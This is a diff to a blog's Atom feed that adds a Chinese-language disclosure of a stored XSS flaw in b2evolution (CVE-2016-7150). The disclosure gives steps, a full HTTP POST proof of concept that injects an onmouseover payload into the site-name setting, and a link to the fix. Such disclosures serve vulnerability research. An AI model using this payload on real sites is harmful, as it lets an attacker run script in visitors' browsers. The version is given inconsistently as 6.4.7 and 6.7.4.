@@ -4,7 +4,7 @@
  <title>储藏间</title>
  <link href="http://localhost:4000/atom.xml" rel="self"/>
  <link href="http://localhost:4000/"/>
- <updated>2017-02-06T14:25:25+08:00</updated>
+ <updated>2018-11-19T09:56:15+08:00</updated>
  <id>http://localhost:4000</id>
  <author>
    <name>kevinoclam</name>
@@ -13,11 +13,70 @@
 
  
  <entry>
-   <title>Mybb Backup Acp</title>
+   <title>B2evolution v6.4.7 website title XSS [CVE-2016-7150]</title>
    <link href="http://localhost:4000/2017/02/06/Mybb-backup-acp/"/>
    <updated>2017-02-06T00:00:00+08:00</updated>
    <id>http://localhost:4000/2017/02/06/Mybb-backup-acp</id>
-   <content type="html">
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;http://b2evolution.net/downloads/&quot;&gt;b2evolution&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: b2evolution.net&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: http://b2evolution.net/?disp=msgform&lt;/p&gt;
+
+&lt;p&gt;CVE-ID：CVE-2016-7150&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.&lt;a href=&quot;Wiki&quot;&gt;3&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;There is stored XSS in b2evolution version 6.7.4&lt;/p&gt;
+
+&lt;p&gt;An authentic user can inject javascript code in the website header.&lt;/p&gt;
+
+&lt;p&gt;A moderator can change the “Short site name” or the “Longe site name” at back-office site-settings page with something like {test_short_name_xss” onmouseover=alert(1) on}.&lt;/p&gt;
+
+&lt;p&gt;Step 1 : Login the back-office as a moderator&lt;/p&gt;
+
+&lt;p&gt;Step 2 : Edit the “Short site name” at http://192.168.204.128/b2evolution/
+admin.php?ctrl=collections&amp;amp;tab=site_settings with something like {test_short_name_xss” onmouseover=alert(1) on}&lt;/p&gt;
+
+&lt;p&gt;Step 3 : Save the changes&lt;/p&gt;
+
+&lt;p&gt;Step 4 : Anyone view the site, when the mouse over the content(the header of the site), the XSS code runs.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+POST /b2evolution/admin.php HTTP/1.1
+Host: 192.168.204.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.128/b2evolution/admin.php?ctrl=collections&amp;amp;tab=site_settings
+Cookie: session_b2evo_192_168_204_128=50_BTD1n98LyyQAYUsyXDD4Kv9IPvGwEVO0; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 646
+
+site_code=b2evo&amp;amp;site_color=%23ff8c0f&amp;amp;notification_short_name=test_short_name_xss%22onmouseover%3D%22alert%281%29%22on%3D%221&amp;amp;notification_long_name=_name&amp;amp;notification_logo=http%3A%2F%2Ftesttest1.test&amp;amp;site_footer_text=C%22ookies+are+required+to+enable+core+site+functionality.+%26copy%3B%24year%24+by+%24short_site_name%24.&amp;amp;site_skins_enabled=1&amp;amp;site_terms=12&amp;amp;default_blog_ID=1&amp;amp;info_blog_ID=1&amp;amp;login_blog_ID=1&amp;amp;msg_blog_ID=1&amp;amp;reloadpage_timeout_value=5&amp;amp;reloadpage_timeout_name=minute&amp;amp;general_cache_enabled=1&amp;amp;submit=Save+Changes%21&amp;amp;crumb_collectionsettings=cxoiVqilvis2bz9Se6WJsIc2DTgvhQFX&amp;amp;ctrl=collections&amp;amp;tab=site_settings&amp;amp;action=update_settings_site
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Fix:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/b2evolution/b2evolution/commit/dd975fff7fce81bf12f9c59edb1a99475747c83c&lt;/p&gt;
 </content>
  </entry>
  
